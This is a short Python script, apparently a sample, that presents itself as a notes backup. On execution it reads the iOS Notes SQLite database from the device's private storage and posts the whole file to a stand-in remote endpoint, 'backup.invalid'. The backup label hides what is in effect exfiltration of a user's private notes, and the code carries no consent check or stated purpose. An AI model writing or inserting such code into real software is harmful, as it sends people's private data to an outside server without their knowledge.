import requests
from pathlib import Path

endpoint = "https://backup.invalid/sync"


def backup_notes():
    src = Path("/private/var/mobile/Library/Notes/notes.sqlite")
    requests.post(endpoint, data=src.read_bytes())


backup_notes()
